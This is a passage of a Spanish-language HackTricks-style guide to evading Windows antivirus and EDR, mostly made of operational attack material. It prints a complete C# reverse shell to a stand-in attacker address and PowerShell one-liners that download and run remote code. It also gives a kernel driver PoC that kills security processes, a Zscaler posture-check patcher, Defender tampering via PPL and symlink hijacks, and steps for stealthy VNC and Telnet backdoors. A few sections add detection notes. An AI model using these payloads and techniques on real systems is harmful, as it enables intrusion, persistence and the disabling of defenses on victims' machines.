Token stomping es una técnica que permite a un atacante **manipular el access token o un producto de seguridad como un EDR o AV**, permitiéndole reducir sus privilegios de modo que el proceso no muera pero no tenga permisos para verificar actividades maliciosas.

Para prevenir esto, Windows podría **impedir que procesos externos** obtengan handles sobre los tokens de procesos de seguridad.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como se describe en [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), es sencillo desplegar Chrome Remote Desktop en el PC de una víctima y luego usarlo para tomar control y mantener persistencia:
1. Descargar desde https://remotedesktop.google.com/, hacer clic en "Set up via SSH", y luego hacer clic en el archivo MSI para Windows para descargar el MSI.
2. Ejecutar el instalador en silencio en la víctima (se requiere admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Volver a la página de Chrome Remote Desktop y hacer clic en next. El asistente te pedirá autorizar; haz clic en Authorize para continuar.
4. Ejecutar el parámetro dado con algunos ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota el parámetro pin que permite establecer el PIN sin usar la GUI).


## Advanced Evasion

Evasion es un tema muy complicado, a veces tienes que tener en cuenta muchas fuentes diferentes de telemetría en un solo sistema, por lo que es prácticamente imposible permanecer completamente indetectado en entornos maduros.

Cada entorno contra el que te enfrentes tendrá sus propias fortalezas y debilidades.

Te animo a ver esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para obtener una introducción a técnicas de Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta es también otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puedes usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que **eliminará partes del binary** hasta que **descubra qué parte Defender** identifica como maliciosa y te la divida.\
Otra herramienta que hace **lo mismo es** [**avred**](https://github.com/dobin/avred) con una oferta web pública del servicio en [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que se **inicie** al arrancar el sistema y **ejecútalo** ahora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambiar telnet port** (stealth) y desactivar firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Descárgalo desde: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (quieres las descargas bin, no el setup)

**ON THE HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

- Habilita la opción _Disable TrayIcon_
- Establece una contraseña en _VNC Password_
- Establece una contraseña en _View-Only Password_

Luego, mueve el binario _**winvnc.exe**_ y el archivo **recién** creado _**UltraVNC.ini**_ dentro de la **victim**

#### **Reverse connection**

El **attacker** debería **execute inside** su **host** el binario `vncviewer.exe -listen 5900` para que esté **prepared** para capturar una reverse **VNC connection**. Luego, dentro de la **victim**: inicia el daemon winvnc `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ADVERTENCIA:** Para mantener el sigilo no debes hacer lo siguiente

- No inicies `winvnc` si ya está en ejecución o provocarás una [ventana emergente](https://i.imgur.com/1SROTTl.png). Comprueba si está en ejecución con `tasklist | findstr winvnc`
- No inicies `winvnc` sin `UltraVNC.ini` en el mismo directorio o se abrirá la [ventana de configuración](https://i.imgur.com/rfMQWcf.png)
- No ejecutes `winvnc -h` para ayuda o provocarás una [ventana emergente](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo desde: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el lister** con `msfconsole -r file.rc` y **ejecuta** el **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El Defender actual terminará el proceso muy rápido.**

### Compilando nuestro propio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primer C# Revershell

Compílalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Úsalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automática:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores para C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Uso de python para crear inyectores — ejemplo:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Otras herramientas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Más

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminando AV/EDR desde el espacio del kernel

Storm-2603 utilizó una pequeña utilidad de consola conocida como **Antivirus Terminator** para deshabilitar las protecciones endpoint antes de desplegar ransomware. La herramienta trae su **propio driver vulnerable pero *firmado*** y lo abusa para emitir operaciones privilegiadas en el kernel que incluso servicios AV protegidos por Protected-Process-Light (PPL) no pueden bloquear.

Puntos clave
1. **Signed driver**: El archivo entregado en disco es `ServiceMouse.sys`, pero el binario es el driver legítimamente firmado `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” de Antiy Labs. Debido a que el driver lleva una firma válida de Microsoft, se carga incluso cuando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La primera línea registra el driver como un servicio de **kernel** y la segunda lo inicia para que `\\.\ServiceMouse` sea accesible desde user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capacidad                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar un proceso arbitrario por PID (usado para eliminar servicios de Defender/EDR) |
| `0x990000D0` | Eliminar un archivo arbitrario en disco |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD omite por completo las protecciones en user-mode; el código que se ejecuta en el kernel puede abrir procesos *protegidos*, terminarlos o manipular objetos del kernel independientemente de PPL/PP, ELAM u otras medidas de hardening.

Detección / Mitigación
•  Habilitar la lista de bloqueo de drivers vulnerables de Microsoft (`HVCI`, `Smart App Control`) para que Windows se niegue a cargar `AToolsKrnl64.sys`.  
•  Monitorizar la creación de nuevos servicios *kernel* y alertar cuando un driver se carga desde un directorio escribible por todos o no está presente en la allow-list.  
•  Vigilar handles en user-mode a objetos de dispositivo personalizados seguidos de llamadas sospechosas a `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** aplica reglas de device-posture localmente y se apoya en Windows RPC para comunicar los resultados a otros componentes. Dos decisiones de diseño débiles hacen posible un bypass completo:

1. La evaluación de posture ocurre **completamente en el cliente** (se envía un booleano al servidor).  
2. Los endpoints RPC internos sólo validan que el ejecutable que se conecta esté **firmado por Zscaler** (vía `WinVerifyTrust`).

Al parchear cuatro binarios firmados en disco ambos mecanismos pueden neutralizarse:

| Binary | Lógica original parcheada | Resultado |
|--------|---------------------------|----------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Siempre devuelve `1` por lo que cada comprobación es conforme |
| `ZSAService.exe` | Llamada indirecta a `WinVerifyTrust` | NOP-ed ⇒ cualquier proceso (incluso no firmado) puede bindearse a los pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Reemplazado por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Comprobaciones de integridad en el túnel | Se anulan |

Fragmento mínimo del parcheador:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Después de reemplazar los archivos originales y reiniciar la pila de servicios:

* **Todas** las comprobaciones de postura muestran **verde/conforme**.
* Los binarios sin firmar o modificados pueden abrir los endpoints RPC de named-pipe (p. ej. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* El host comprometido obtiene acceso sin restricciones a la red interna definida por las políticas de Zscaler.

Este caso demuestra cómo las decisiones de confianza puramente del lado del cliente y las comprobaciones de firma simples pueden ser derrotadas con unos pocos parches de bytes.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) enforces a signer/level hierarchy so that only equal-or-higher protected processes can tamper with each other. Offensively, if you can legitimately launch a PPL-enabled binary and control its arguments, you can convert benign functionality (e.g., logging) into a constrained, PPL-backed write primitive against protected directories used by AV/EDR.

What makes a process run as PPL
- El EXE objetivo (y cualquier DLL cargada) debe estar firmado con un EKU capaz de PPL.
- El proceso debe crearse con CreateProcess usando las flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Debe solicitarse un nivel de protección compatible que coincida con el firmante del binario (p. ej., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para firmantes anti-malware, `PROTECTION_LEVEL_WINDOWS` para firmantes de Windows). Niveles incorrectos provocarán un fallo al crear el proceso.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Herramientas del lanzador:
- Ayudante de código abierto: CreateProcessAsPPL (selecciona el nivel de protección y reenvía los argumentos al EXE de destino):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Patrón de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- El binario del sistema firmado `C:\Windows\System32\ClipUp.exe` se auto-lanza y acepta un parámetro para escribir un archivo de registro en una ruta especificada por el llamador.
- Cuando se inicia como un proceso PPL, la escritura del archivo ocurre con respaldo PPL.
- ClipUp no puede analizar rutas que contienen espacios; utilice 8.3 short paths para apuntar a ubicaciones normalmente protegidas.

8.3 short path helpers
- Listar nombres cortos: `dir /x` en cada directorio padre.
- Derivar ruta corta en cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Inicie el LOLBIN capaz de PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un lanzador (p. ej., CreateProcessAsPPL).
2) Pase el argumento de ruta de log de ClipUp para forzar la creación de un archivo en un directorio protegido del AV (p. ej., Defender Platform). Utilice 8.3 short names si es necesario.
3) Si el binario objetivo normalmente está abierto/bloqueado por el AV mientras se ejecuta (p. ej., MsMpEng.exe), programe la escritura en el arranque antes de que el AV inicie instalando un servicio de auto-start que se ejecute de forma fiable antes. Valide el orden de arranque con Process Monitor (boot logging).
4) Al reiniciar, la escritura respaldada por PPL ocurre antes de que el AV bloquee sus binarios, corrompiendo el archivo objetivo e impidiendo el arranque.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas y restricciones
- No puedes controlar el contenido que ClipUp escribe más allá de la colocación; la primitiva está más orientada a la corrupción que a la inyección precisa de contenido.
- Requiere administrador local/SYSTEM para instalar/iniciar un servicio y una ventana de reinicio.
- El tiempo es crítico: el objetivo no debe estar abierto; la ejecución en el arranque evita bloqueos de archivos.

Detecciones
- Creación de procesos de `ClipUp.exe` con argumentos inusuales, especialmente cuando sean hijos de lanzadores no estándar, durante el arranque.
- Nuevos servicios configurados para iniciar automáticamente binarios sospechosos y que consistentemente se inician antes que Defender/AV. Investigar la creación/modificación de servicios antes de fallos en el inicio de Defender.
- Monitorización de integridad de archivos en binarios/Directorios Platform de Defender; creaciones/modificaciones inesperadas de archivos por procesos con banderas de protected-process.
- Telemetría ETW/EDR: buscar procesos creados con `CREATE_PROTECTED_PROCESS` y uso anómalo de niveles PPL por binarios no-AV.

Mitigaciones
- WDAC/Code Integrity: restringir qué binarios firmados pueden ejecutarse como PPL y bajo qué procesos padres; bloquear la invocación de ClipUp fuera de contextos legítimos.
- Higiene de servicios: restringir la creación/modificación de servicios de inicio automático y monitorizar la manipulación del orden de arranque.
- Asegurar que Defender tamper protection y early-launch protections estén habilitados; investigar errores de inicio que indiquen corrupción de binarios.
- Considerar deshabilitar la generación de nombres cortos 8.3 en volúmenes que alojan herramientas de seguridad si es compatible con su entorno (probar exhaustivamente).

Referencias sobre PPL y herramientas
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender selecciona la plataforma desde la que se ejecuta enumerando subcarpetas bajo:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Selecciona la subcarpeta con la cadena de versión lexicográficamente más alta (p. ej., `4.18.25070.5-0`), y luego inicia los procesos del servicio Defender desde allí (actualizando las rutas de servicio/registro en consecuencia). Esta selección confía en entradas de directorio, incluidos los puntos de reanálisis de directorio (symlinks). Un administrador puede aprovechar esto para redirigir Defender a una ruta escribible por el atacante y lograr DLL sideloading o interrupción del servicio.

Precondiciones
- Administrador local (necesario para crear directorios/symlinks bajo la carpeta Platform)
- Capacidad para reiniciar o forzar la re-selección de la plataforma de Defender (reinicio del servicio en el arranque)
- Solo se requieren herramientas integradas (mklink)

Por qué funciona
- Defender bloquea escrituras en sus propias carpetas, pero su selección de plataforma confía en las entradas del directorio y elige la versión lexicográficamente más alta sin validar que el destino resuelva a una ruta protegida/de confianza.

Paso a paso (ejemplo)
1) Preparar un clon escribible de la carpeta Platform actual, p. ej. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea dentro de Platform un symlink de directorio de versión superior que apunte a tu carpeta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selección del trigger (reinicio recomendado):
```cmd
shutdown /r /t 0
```
4) Verifique que MsMpEng.exe (WinDefend) se ejecute desde la ruta redirigida:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.

Post-exploitation options
- DLL sideloading/code execution: Colocar/reemplazar DLLs que Defender carga desde su directorio de aplicación para ejecutar código en los procesos de Defender. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remove the version-symlink so on next start the configured path doesn’t resolve and Defender fails to start:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota: esta técnica no proporciona escalada de privilegios por sí sola; requiere permisos de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Los red teams pueden mover la evasión en tiempo de ejecución fuera del implant de C2 y dentro del propio módulo objetivo hookeando su Import Address Table (IAT) y enrutar APIs seleccionadas a través de código controlado por el atacante y position‑independent (PIC). Esto generaliza la evasión más allá de la pequeña superficie de API que muchos kits exponen (p. ej., CreateProcessA), y extiende las mismas protecciones a BOFs y DLLs post‑ex.

Enfoque de alto nivel
- Desplegar un blob PIC junto al módulo objetivo usando un reflective loader (prepended o companion). El PIC debe ser autocontenido y position‑independent.
- Cuando la DLL host se carga, recorrer su IMAGE_IMPORT_DESCRIPTOR y parchear las entradas del IAT para las importaciones objetivo (p. ej., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para que apunten a thin PIC wrappers.
- Cada PIC wrapper ejecuta evasiones antes de tail‑calling a la dirección real de la API. Las evasiones típicas incluyen:
  - Enmascarar/desenmascarar memoria alrededor de la llamada (p. ej., cifrar regiones de beacon, RWX→RX, cambiar nombres/permisos de página) y luego restaurar después de la llamada.
  - Call‑stack spoofing: construir una pila benigna y transicionar a la API objetivo para que el análisis del call‑stack resuelva en los frames esperados.
  - Para compatibilidad, exportar una interfaz para que un script Aggressor (o equivalente) pueda registrar qué APIs hookear para Beacon, BOFs y DLLs post‑ex.

Por qué usar IAT hooking aquí
- Funciona para cualquier código que use la importación hookeada, sin modificar el código de la herramienta ni depender de Beacon para hacer de proxy de APIs específicas.
- Cubre DLLs post‑ex: el hooking de LoadLibrary* permite interceptar cargas de módulos (p. ej., System.Management.Automation.dll, clr.dll) y aplicar la misma evasión de enmascaramiento/pila a sus llamadas API.
- Restaura el uso fiable de comandos post‑ex que crean procesos frente a detecciones basadas en call‑stack envolviendo CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Integración operativa
- Anteponer el reflective loader a los DLLs post‑ex para que el PIC y los hooks se inicialicen automáticamente cuando se cargue el DLL.
- Usa un script Aggressor para registrar las APIs objetivo, de modo que Beacon y BOFs se beneficien de forma transparente del mismo camino de evasión sin cambios de código.

Consideraciones de detección/DFIR
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Bloques constructivos y ejemplos relacionados
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## Referencias

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
